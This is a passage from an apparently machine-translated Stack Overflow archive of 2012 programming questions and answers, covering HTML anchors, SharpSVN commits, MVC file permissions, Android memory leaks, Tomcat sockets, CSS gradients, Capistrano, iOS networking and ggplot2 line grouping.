    <div><a href="#">I'm a block</a></div><br />
     <div><a href="#2"><span>I'm a block 2<span></a></div>
</body>
</html> 
```

试试这个代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:33:23.887

您不能将 div 放置在锚点内...锚点是内联元素，不能在其中包含块级元素。

这不会验证

```
 <a href="#2"><div>I'm a block 2</div></a> 
```

你应该把它改成

```
 <div><a href="#2">I'm a block 2</a></div> 
```

它会起作用

**编辑**

我阅读了您所附的内容，发现它在 HTML5 上有效

您应该将 CSS 更改为：

```
 a:hover div { background-color: #333; color: red;} 
```

它会改变

**编辑**

试试这个 CSS ：

```
 a:hover,
    a:hover div { background-color: #333; color: red;} 
```

[在这个小提琴](http://jsfiddle.net/vJEEn/2/)上看到它

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:48:08.473

尝试添加`background-color: inherit;`到 DIV 样式

```
<a href=""><div style="background-color: inherit;">I'm a block 2</div></a>​ 
```

检查这个[JSFiddle](http://jsfiddle.net/nalaka526/vJEEn/4/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T08:50:52.520

在你的css中添加这一行它也可以工作

```
a:hover > div { background-color: #333; display: inline-block } 
```

[**看演示**](http://jsfiddle.net/akhurshid/vJEEn/5/)

但是您不能将 div 放在锚点内，它不会被 w3c 验证。

# c# - SharpSVN 无法提交（... 不是工作副本）

> ID：11736066
> 
> 赞同：0
> 
> 时间：2012-07-31T08:30:41.340
> 
> 标签：c#, .net, svn, exception-handling, sharpsvn

我是 SharpSVN 的新手。我从 Internet 上找到了许多与 SharpSVN 相关的示例。我也做了一些成功案例，比如 Checkout

但问题是，我不能调用 commit 和 Add 函数：

我要做的操作是从我的 PC 中选择一个文件，然后添加到指定的 SVN 文件夹，如果文件存在，它应该被复制为新版本。

这是我的代码：

```
private void button1_Click(object sender, EventArgs e)
{
    // FileUpload1.SaveAs("C:\\Users\\user\\Desktop\\crazycodeee\\" + FileUpload1.FileName);
    SvnClient client = new SvnClient();
    client.Authentication.Clear();
    client.Authentication.DefaultCredentials = new NetworkCredential("crazyufuk", "123456");
    SvnCheckOutArgs coArgs = new SvnCheckOutArgs();
    coArgs.Depth = SvnDepth.Infinity;
    // client.CheckOut(new Uri("http://localhost:8080/svn/crazycode/branches/"), "C:\\Users\\TTVERCIN\\Desktop\\crazycodeee");
    Add("C:\\Users\\user\\Desktop\\test_folderl\\");
    Commit("C:\\Users\\user\\Desktop\\crazycodeee", "AS"); 
}

public bool Add(string path)  
{
    using (SvnClient client = new SvnClient())
    {
        SvnAddArgs args = new SvnAddArgs();
        args.Depth = SvnDepth.Empty;
        args.AddParents = true;
        return client.Add(path, args);
    }
}

public bool Commit(string path, string message)  //second
{
    using (SvnClient client = new SvnClient())
    {
        SvnCommitArgs args = new SvnCommitArgs();
        args.LogMessage = message;
        args.ThrowOnError = true;
        args.ThrowOnCancel = true;

        try
        {
            return client.Commit(path, args);
        }
        catch (Exception e)
        {
            if (e.InnerException != null)
                throw new Exception(e.InnerException.Message, e);
            throw e;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:34:20.057

为了向 SVN 存储库添加或提交文件，您必须在本地签出相关的存储库。

```
// client.CheckOut(new Uri("http://localhost:8080/svn/crazycode/branches/"), "C:\\Users\\TTVERCIN\\Desktop\\crazycodeee"); 
```

注释掉的代码将代码签出到这个 root 的存储库中`"C:\\Users\\TTVERCIN\\Desktop\\crazycodeee"`，但是您添加的文件需要是这个的子级。

在你的行

```
Add("C:\\Users\\TTVERCIN\\Desktop\\CSI_headerFooterMenu_prepaid_kurumsal\\"); 
```

如果文件夹`CSI_headerFootermenu_prepaid_kurumsal`中的位置`crazycodeee`（并且您注释掉了结帐行），那么我怀疑它会起作用。

# asp.net-mvc - How do you intercept a request for a file to check permissions in MVC3?

> ID：11736069
> 
> 赞同：2
> 
> 时间：2012-07-31T08:30:53.603
> 
> 标签：asp.net-mvc, asp.net-mvc-3, file-permissions

I have file uploads working great on an ASP MVC3 web site. Currently the files are saved in a folder on the web site called "Files". Users can upload any type of file (e.g. myphoto.jpg, mydocument.docx, etc).

When a user uploads a file I store information about the file in a SQL database and who uploaded it etc.

My questions:

1.  How do I intercept a GET request to a file URL (e.g. /Files/myphoto.jpg) to see if the user is allowed to view that file? (based on their rights in the application)? I don't like the idea of writing a route constraint to check the database before allowing access.
2.  Ideally I'd like to store the files in a different location than the web site file location, but somewhere where the website can determine the file and it's location from the request, yet serve it up as if it was at the location requested (correct content-type headers etc).

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:42:32.193

您可以添加一个控制器来服务器文件。

```
public class FileController : Controller
{

    private IFileStore _fileStore;

    public FileController(IFileStrore fileStore)
    {
        this._fileStore = fileStore; 
    }

    public ActionResult Index(string fileName)
    {
        // Do a database look up if the user has permission
        if (_fileStore.HasPermission(fileName, User))
        {
            // Flush the file content if the user has permission
            var myfile = _fileStore.GetFile(fileName);
            Response.ClearContent();
            Response.AddHeader("Content-Disposition", "attachment; filename=" + myfile.FileName);
            Response.AddHeader("Content-Length", myfile.Length.ToString());

            Response.ContentType = myfile.Extension.ToLower();
            Response.WriteFile(myfile.FullName, false);
            Response.Flush();
            Response.Close();
        }
        else
        {
            // Return a Access Denied page
            return View("NoPermission");
        }
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T10:06:56.470

您可以在 web.config 中设置它：

```
<!-- This section gives the authenticated user with myRole role access to all of the files that are stored in the images folder.  -->
<location path="images">
   <system.web>
     <authorization>
    <allow users =".\myRole" />
     </authorization>
   </system.web>
</location> 
```

[http://msdn.microsoft.com/en-us/library/8d82143t](http://msdn.microsoft.com/en-us/library/8d82143t)

# android - Why caching inflated layout in a static variable could be a memory leak?

> ID：11736071
> 
> 赞同：0
> 
> 时间：2012-07-31T08:30:59.473
> 
> 标签：android, layout, layout-inflater

I need to pre load a complex layout so I can show the activity more quickly the first time:

```
LayoutInflater inflater = (LayoutInflater) mainActivity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

SlowActivity.cachedView = inflater.inflate(R.layout.activity_layout, null, false); 
```

when SlowActivity starts...

```
public static View cachedView = null; 

@Override
public void onCreate(Bundle savedInstanceState) {

  super.onCreate(savedInstanceState);
        setContentView(this.cachedView);
      }
} 
```

I can't find where I read it but some one says that I'm doing a memory leak using a stati variable to store inflated layout.

Why?

Maybe I need to release some resource when activity is destroyed (never, it's always put on the background...)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:35:27.270

那是因为布局，就像所有的视图一样，有一个对持有它的活动的引用。

因此，在 Activity 关闭并应该被释放后，静态变量持有对引用 this Activity 的视图的引用，因此应用程序占用的内存比它应该的要多。

视图不是您应该尽量避免使用静态变量进行缓存的唯一变量。一个例子是drawables，如此[处所示](http://www.curious-creature.org/2008/12/18/avoid-memory-leaks-on-android/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:35:51.453

因为 Android 可以（并且将会）在每次需要内存时销毁您的应用程序/活动（包括静态变量！）。所以你必须考虑一下，什么时候创建静态变量。否则，在应用程序处于非活动状态后，您会变得奇怪且难以发现崩溃。

# database - TCP connections and Tomcat

> ID：11736076
> 
> 赞同：1
> 
> 时间：2012-07-31T08:31:08.567
> 
> 标签：database, tomcat, tcp, connection

I need to configure Tomcat 5.5 to receive direct TCP connections (instead of receiving HTTP connections).

The idea is to receive TCP connections from a client and store the information in a database.

Can you help?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T10:02:32.843

你的问题体现了一个矛盾的术语。Tomcat是一个servlet容器；servlet 使用 HTTP。你总是可以在 Servlet 或 ServletContextListener 中打开一个 ServerSocket，但是你到底需要 Tomcat 做什么呢？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T15:10:09.853

虽然我认为 EJP 是正确的，但 Tomcat 旨在服务于 http 连接，这是一个带有监听器的基本方法：

```
package test;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;

public class ServerSocketListener implements ServletContextListener {

     private ServerSocket serverSocket;
     private final int PORT = 8081;

     @Override
     public void contextInitialized(ServletContextEvent sce) {
            System.out.println("Starting server socket at port: " + PORT);
            try {
                 serverSocket = new ServerSocket(PORT);
                 while (true) {
                      Socket client = serverSocket.accept();
                      System.out.println("Client connected from: "+client.getInetAddress().getHostAddress());
                      //handle connection ...
                 }
            } catch (IOException e) {
                 e.printStackTrace();
            }
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
         try {
             if(serverSocket!=null) {
                 System.out.println("Stopping server socket at port: " + PORT);
                 serverSocket.close();
             }
         } catch (IOException e) {
              e.printStackTrace();
         }
     }
 } 
```

在您的 web.xml 添加这些行：

```
<listener>
     <listener-class>test.ServerSocketListener</listener-class>
</listener> 
```

然后拿起你的手机并点击：http://[Server-ip]:8081/。

# asp.net - 控件的反射 我有一个登录页面，中间有登录字段，在 . 如何创建此表的反射效果？我想在这个广场下有一个有点距离的另一个，就像它一样，但只显示背景，而不是控件。所以我试图在它下面再做一张桌子，但我只想展示它的 10%。这可以做到吗？ 据我所知，已经尝试过渐变，但看起来不太好：

|  |
|  

&#124; <asp:contentplaceholder runat="server" id="rightContent"></asp:contentplaceholder> &#124;
&#124;  &#124;

 |

.loginContent { -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px; width: 500px; height: 300px; background-color: #f08409; } .loginContentReflection { -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px; width: 500px; height: 50px; /* IE9 SVG, needs conditional override of 'filter' to 'none' */ background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmY2MwMiIgc3RvcC1vcGFjaXR5PSIwLjMiLz4KICAgIDxzdG9wIG9mZnNldD0iMjglIiBzdG9wLWNvbG9yPSIjZjhkMzQwIiBzdG9wLW9wYWNpdHk9IjAuMyIvPgogICAgPHN0b3Agb2Zmc2V0PSI4NCUiIHN0b3AtY29sb3I9IiNlOWUwYmIiIHN0b3Atb3BhY2l0eT0iMCIvPgogICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjZTVlNGRlIiBzdG9wLW9wYWNpdHk9IjAiLz4KICA8L2xpbmVhckdyYWRpZW50PgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIGZpbGw9InVybCgjZ3JhZC11Y2dnLWdlbmVyYXRlZCkiIC8+Cjwvc3ZnPg==); background: -moz-linear-gradient(top, rgba(255,204,2,0.3) 0%, rgba(248,211,64,0.3) 28%, rgba(233,224,187,0) 84%, rgba(229,228,222,0) 100%); /* FF3.6+ */ background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(255,204,2,0.3)), color-stop(28%,rgba(248,211,64,0.3)), color-stop(84%,rgba(233,224,187,0)), color-stop(100%,rgba(229,228,222,0))); /* Chrome,Safari4+ */ background: -webkit-linear-gradient(top, rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* Chrome10+,Safari5.1+ */ background: -o-linear-gradient(top, rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* Opera 11.10+ */ background: -ms-linear-gradient(top, rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* IE10+ */ background: linear-gradient(to bottom, rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* W3C */ filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#4dffcc02', endColorstr='#00e5e4de',GradientType=0 ); /* IE6-8 */ } Capistrano 资产预编译错误 当我使用 capistrano 推送到我的生产服务器时，我收到此错误： executing "cd /var/www/my_app/releases/20120731082050 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile" servers: ["my_app.com"] [my_app.com] executing command *** [err :: my_app.com] /usr/bin/ruby1.9.1 /var/www/my_app/shared/bundle/ruby/1.9.1/bin/rake assets:precompile:nondigest RAILS_ENV=production RAILS_GROUPS=assets *** [err :: my_app.com] command finished in 74149ms 尽管出现错误，预编译仍然有效。我试过跑步 cd /var/www/my_app/releases/20120731082050 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile 在服务器上它可以工作，但它会将其打印到控制台： /usr/bin/ruby1.9.1 /var/www/my_app/shared/bundle/ruby/1.9.1/bin/rake assets:precompile:nondigest RAILS_ENV=production RAILS_GROUPS=assets 与 capistrano 输出相匹配（注意在原始调用中添加了“nondigest”。我知道这不是致命错误，因为它仍然有效，但我将如何阻止它打印此错误？ asp.nethtmlcss 4 0 回答 0 Related 1 android - 如何找到手机短信ID？ 3 python - 正则表达式捕获多行文本正文 1 php - 如何在库 codeigniter 上调用私有方法 1 asp.net-mvc - MVC4：User.IsInRole 无法正常工作 3 java - Java 等价于 C++ 复制赋值运算符 1 excel - 带有 IF 语句和条件的公式 1 c# - WP8 处理通过数据绑定接收的空值作为其他值/好值 4 javascript - Jquery以间隔加载外部图像 2 mongodb - 使用 PHP -Mongodb 从大量电子邮件地址中查找坏词 1 c# - 在 Cognos 中嵌入 C# 或 PHP 代码 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：11736080
> 
> 赞同：0
> 
> 时间：
> 
> 标签：asp.net, html, css

我有一个登录页面，中间有登录字段，在 . 如何创建此表的反射效果？我想在这个广场下有一个有点距离的另一个，就像它一样，但只显示背景，而不是控件。所以我试图在它下面再做一张桌子，但我只想展示它的 10%。这可以做到吗？

据我所知，已经尝试过渐变，但看起来不太好：

```
 <table>
      <tr>
        <td align="center" valign="top">
           <table>
              <tbody>
                  <tr>
                     <td class="loginContent">
                         <asp:ContentPlaceHolder runat="server" ID="rightContent">
                         </asp:ContentPlaceHolder>
                     </td>
                  </tr>
                  <tr class="lineBreak15">
                  </tr>
                  <tr>
                     <td class="loginContentReflection">
                     </td>
                  </tr>
              </tbody>
           </table>
        </td>
      </tr>
    </table>

.loginContent 
{
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
    width: 500px;
    height: 300px;
    background-color: #f08409;
}
.loginContentReflection 
{
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
    width: 500px;
    height: 50px;
    /* IE9 SVG, needs conditional override of 'filter' to 'none' */
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmY2MwMiIgc3RvcC1vcGFjaXR5PSIwLjMiLz4KICAgIDxzdG9wIG9mZnNldD0iMjglIiBzdG9wLWNvbG9yPSIjZjhkMzQwIiBzdG9wLW9wYWNpdHk9IjAuMyIvPgogICAgPHN0b3Agb2Zmc2V0PSI4NCUiIHN0b3AtY29sb3I9IiNlOWUwYmIiIHN0b3Atb3BhY2l0eT0iMCIvPgogICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjZTVlNGRlIiBzdG9wLW9wYWNpdHk9IjAiLz4KICA8L2xpbmVhckdyYWRpZW50PgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIGZpbGw9InVybCgjZ3JhZC11Y2dnLWdlbmVyYXRlZCkiIC8+Cjwvc3ZnPg==);
    background: -moz-linear-gradient(top,  rgba(255,204,2,0.3) 0%, rgba(248,211,64,0.3) 28%, rgba(233,224,187,0) 84%, rgba(229,228,222,0) 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(255,204,2,0.3)), color-stop(28%,rgba(248,211,64,0.3)), color-stop(84%,rgba(233,224,187,0)), color-stop(100%,rgba(229,228,222,0))); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(top,  rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(top,  rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(top,  rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* IE10+ */
    background: linear-gradient(to bottom,  rgba(255,204,2,0.3) 0%,rgba(248,211,64,0.3) 28%,rgba(233,224,187,0) 84%,rgba(229,228,222,0) 100%); /* W3C */
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#4dffcc02', endColorstr='#00e5e4de',GradientType=0 ); /* IE6-8 */

    } 
```

# ruby-on-rails - Capistrano 资产预编译错误

> ID：11736081
> 
> 赞同：0
> 
> 时间：2012-07-31T08:31:27.350
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, capistrano, sprockets

当我使用 capistrano 推送到我的生产服务器时，我收到此错误：

```
executing "cd /var/www/my_app/releases/20120731082050 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile"
servers: ["my_app.com"]
[my_app.com] executing command
*** [err :: my_app.com] /usr/bin/ruby1.9.1 /var/www/my_app/shared/bundle/ruby/1.9.1/bin/rake assets:precompile:nondigest RAILS_ENV=production RAILS_GROUPS=assets
*** [err :: my_app.com] 
command finished in 74149ms 
```

尽管出现错误，预编译仍然有效。我试过跑步

```
cd /var/www/my_app/releases/20120731082050 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile 
```

在服务器上它可以工作，但它会将其打印到控制台：

```
/usr/bin/ruby1.9.1 /var/www/my_app/shared/bundle/ruby/1.9.1/bin/rake assets:precompile:nondigest RAILS_ENV=production RAILS_GROUPS=assets 
```

与 capistrano 输出相匹配（注意在原始调用中添加了“nondigest”。我知道这不是致命错误，因为它仍然有效，但我将如何阻止它打印此错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-26T23:03:36.713

`deploy:assets`我只是用自己的代码覆盖了任务：

```
namespace :deploy
  task :assets do
    run "cd #{current_path} && bundle exec rake assets:precompile RAILS_ENV=#{rails_env}"
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-21T03:18:16.663

运行`rake assets:precompile`时如何避免默认输出

解决方案是**添加`-q`你的命令**，

例如`executing "cd /var/www/my_app/releases/20120731082050 && bundle exec rake RAILS_ENV=production RAILS_GROUPS=assets assets:precompile -q"`

分析如下，如果你想看：

```
# :gem_path/actionpack/lib/sprockets/assets.rake
namespace :assets do

  # task entry, it will call invoke_or_reboot_rake_task
  task :precompile do
    invoke_or_reboot_rake_task "assets:precompile:all"
  end

  # it will call ruby_rake_task
  def invoke_or_reboot_rake_task(task)
    ruby_rake_task task
  end

  # it will call ruby
  def ruby_rake_task(task, fork = true)
    env    = ENV['RAILS_ENV'] || 'production'
    groups = ENV['RAILS_GROUPS'] || 'assets'
    args   = [$0, task,"RAILS_ENV=#{env}","RAILS_GROUPS=#{groups}"]
    ruby(*args)
  end
end

# :gem_path/rake/file_utils.rb
module FileUtils

  # it will call sh
  def ruby(*args,&block)
    options = (Hash === args.last) ? args.pop : {}
    sh(*([RUBY] + args + [options]), &block)
  end

  # it will call set_verbose_option
  # and if options[:verbose] == true, it do not output cmd
  #   but default of options[:verbose] is an object
  def sh(*cmd, &block)
    # ...
    set_verbose_option(options)
    # ...
    Rake.rake_output_message cmd.join(" ") if options[:verbose]
    # ...
  end

  # default of options[:verbose] is Rake::FileUtilsExt::DEFAULT, which is an object
  def set_verbose_option(options) # :nodoc:
    unless options.key? :verbose
      options[:verbose] =
        Rake::FileUtilsExt.verbose_flag == Rake::FileUtilsExt::DEFAULT ||
        Rake::FileUtilsExt.verbose_flag
    end
  end
end

# :gem_path/rake/file_utils_ext.rb
module Rake
  module FileUtilsExt
    DEFAULT = Object.new
  end
end

# :gem_path/rake/application.rb
          # the only to solve the disgusting output when run `rake assets:precompile`
          #   is add a `-q` option.
          ['--quiet', '-q',
            "Do not log messages to standard output.",
            lambda { |value| Rake.verbose(false) }
          ],
          ['--verbose', '-v',
            "Log message to standard output.",
            lambda { |value| Rake.verbose(true) }
          ], 
```

# iphone - UITableView 没有响应 performSelectorOnMainThread

> ID：11736082
> 
> 赞同：0
> 
> 时间：2012-07-31T08:31:32.617
> 
> 标签：iphone, ios, uitableview

我设置了一个 UITableView，它应该在从网站加载某些数据后显示一些信息。为了更新 UI 并完成加载数据，我使用了以下方法：

```
performSelectorOnMainThread:@selector(getBooks) withObject:nil waitUntilDone:YES  

-(void)getBooks{

NSMutableString *theURL = [[NSMutableString alloc] initWithString:@"theURL"];

[theURL appendFormat:@"&UserID=%@", _appDel.userID];

NSLog(@"%@\n", theURL);
NSURLRequest *theRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:theURL]
                                            cachePolicy:NSURLRequestUseProtocolCachePolicy
                                        timeoutInterval:10.0];
NSURLConnection *theConnection=[[NSURLConnection alloc] initWithRequest:theRequest delegate:self];
if (theConnection) {
    receivedData = [NSMutableData data];
} else {
    // Inform the user that the connection failed.
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"An Error Occured" message:@"Couldn't make a connection to the server. Please make sure your internet connection is on." delegate:self cancelButtonTitle:@"Ok" otherButtonTitles: nil];
    [alert show];
} 
```

但是，当我运行此程序时，尽管我将 waitUntilDone 设置为 YES，但程序仍会继续执行。我的印象是 waitUntilDone 会等待选择器，直到它完成执行。谁能解释可能的问题是什么？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:54:11.193

如果您查看[Apple 文档](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/nsobject_Class/Reference/Reference.html#//apple_ref/occ/instm/NSObject/performSelectorOnMainThread:withObject:waitUntilDone:)，他们会说：

> *等待*
> 
> 一个布尔值，指定当前线程是否阻塞，直到在主线程上的接收器上执行指定的选择器之后。指定 YES 来阻塞这个线程；否则，指定 NO 使该方法立即返回。如果当前线程也是主线程，并且您为此参数指定 YES，则消息将立即传递和处理。

因此，如果您**从主线程**调用此方法，那么它将立即执行。

但是，这样做真的没有任何意义。如果您在主线程上，并希望在`getBooks`主线程上执行，那么只需执行以下操作：

```
-(void) viewDidLoad {
   [super viewDidLoad];
   [self getBooks];
} 
```

如果您向我们展示您在内部的实际`getBooks`操作，我们可能会提供更多帮助。例如，如果`getBooks`正在发出远程 HTTP 请求，以获取在线图书数据，那么您根本不想使用`performSelectorOnMainThread:`。你想在后台线程上运行它，然后只在网络请求完成后回调主线程来更新你的 UI。

* * *

**更新：**

有很多方法可以检索 Web 内容。如果你打算`NSURLRequest`直接使用，那么你应该确保这个类实现了`NSURLConnectionDelegate`协议：

```
@interface MyViewController: UIViewController<NSURLConnectionDelegate> { 
```

然后[按照 Apple 示例实现其方法](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/URLLoadingSystem/Tasks/UsingNSURLConnection.html)

```
- (void) connection:(NSURLConnection *) connection didReceiveResponse:(NSURLResponse *) response
{
    // this method is called when the server has determined that it
    // has enough information to create the NSURLResponse

    // it can be called multiple times, for example in the case of a
    // redirect, so each time we reset the data.
    [receivedData setLength:0];
}

- (void) connection:(NSURLConnection *) connection didReceiveData:(NSData *)data
{
    // append the new data to the receivedData
    [receivedData appendData:data];
}

- (void) connection:(NSURLConnection *) connection didFailWithError:(NSError *) error
{
    // release the connection, and the data object
    [connection release];
    [receivedData release];

    // inform the user
    UIAlertView* netAlert = [[UIAlertView alloc] initWithTitle:@"" message:@"Oops!" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
    [netAlert show];
    [netAlert release];
}

- (void) connectionDidFinishLoading:(NSURLConnection *) connection
{   
    if ([receivedData length] > 0) {
        // do something with the data, and then tell the UI to update
        [self performSelectorOnMainThread: @selector(updateUI) withObject: nil waitUntilDone: NO];
    }

    // release the connection, and the data object
    [connection release];
    [receivedData release];
    receivedData = nil;
}

-(void) updateUI {
    [tableView reloadData];
    someLabel.text = @"New Status";
    // whatever else needs updating
} 
```

注意：上面的代码是在引入 ARC 之前编写的。如果您的项目使用 ARC，则需要删除所有带有`release`调用的行。但是，建议确保您`receivedData`的正确保留，因为您将在多个呼叫中使用它。

另一个注意事项：`NSURLConnection`可以多种方式使用。它可以同步使用，也可以异步使用。而且，您始终可以决定在哪个线程上启动它。如果你保持这个：

```
-(void) viewDidLoad {
   [super viewDidLoad];
   [self getBooks];
} 
```

然后连接将在主线程上启动。但是，它仍然是一个**异步**操作。换句话说，`viewDidLoad`在网络请求完成之前它不会阻塞。但是，如果用户在下载发生时对 UI 做任何重要的事情（例如滚动），那么您可能会发现您的 UI 变得不那么响应。如果是这种情况，您可能[想要这样做](https://stackoverflow.com/a/9691134/119114)，或者将网络操作强制到后台线程上。为此，请从以下内容开始：

```
-(void) viewDidLoad {
   [super viewDidLoad];
   [self performSelectorInBackground: @selector(getBooksInBackground) withObject: nil];
} 
```

然后，我上面的`NSURLConnectionDelegate`代码的唯一问题是后台线程的寿命不够长，无法通过委托回调传递响应。为了让它活着，

```
-(void) getBooksInBackground {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    [self getBooks];

    CFRunLoopRun(); // Avoid thread exiting
    [pool release];
} 
```

然后您必须将此调用添加到两者的末尾`connectionDidFinishLoading`并`connection:didFailWithError`清理此后台运行循环：

```
 CFRunLoopStop(CFRunLoopGetCurrent()); 
```

再次，旧代码，所以使用

```
 @autoreleasepool {
    } 
```

对于弧。

# r - ggplot2的奇怪线条

> ID：11736083
> 
> 赞同：3
> 
> 时间：2012-07-31T08:31:34.710
> 
> 标签：r, ggplot2

我有以下数据集：

```
> str(dat)
'data.frame':   5000 obs. of  3 variables:
 $ y: num  0.864 0.869 0.871 0.879 0.874 0.871 0.871 0.873 0.864 0.869 ...
 $ A: Factor w/ 5 levels "0.2","0.5","0.8",..: 1 1 1 1 1 1 1 1 1 1 ...
 $ x: num  1 2 3 4 5 6 7 8 9 10 ...
> head(dat)
      y   A x
1 0.864 0.2 1
2 0.869 0.2 2
3 0.871 0.2 3
4 0.879 0.2 4
5 0.874 0.2 5
6 0.871 0.2 6 
```

“x”列是向量`c(1:5000)`：

```
> all(dat$x==1:5000)
[1] TRUE 
```

因此，在绘制以下图时，我不明白某些线条的存在：

```
ggplot() + geom_line(aes(x=x, y=y, color=A), data=dat) 
```

我所说的线条由图中的三个黑色箭头表示： ![ggplot](../Images/ccf3224e54645852a9cbb555e4832dca.png)

编辑：下面是一个具有可重现模拟数据集的类似示例：

```
set.seed(666)
mu <- rep(c(200, 400, 600, 300, 500), each=1000)
A <- factor(rep(c(1,2,3,1,2), each=1000))
y <- rnorm(length(mu), mu, 100)
dat <- data.frame(x=1:length(mu), y=y, A=A)
ggplot() + geom_line(aes(x=x, y=y, color=A), data=dat) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:34:53.500

您需要数据框中的另一个变量来表示不同的块（即具有相同颜色的区域）和`group`参数`geom_line`：

```
dat <- data.frame(x=1:length(mu), y=y, A=A, B=gl(5, 1000))
ggplot() + geom_line(aes(x=x, y=y, color=A, group=B), data=dat) 
```

![ggplot 输出](../Images/aa32e86c15aa17636c4de0d139ea8527.png)

# mobile - 如何使用 zepto 获取点击事件的位置

> ID：11736087
> 
> 赞同：1
> 
> 时间：2012-07-31T08:31:50.610
> 
> 标签：mobile, jquery, zepto

使用zepto时有什么方法可以获取点击事件的位置？似乎没有在事件对象中传递 screenX screenY 。

# asp.net-mvc-3 - 记录数据的 MiniProfiler 报告

> ID：11736092
> 
> 赞同：2
> 
> 时间：2012-07-31T08:31:58.423
> 
> 标签：asp.net-mvc-3, mvc-mini-profiler

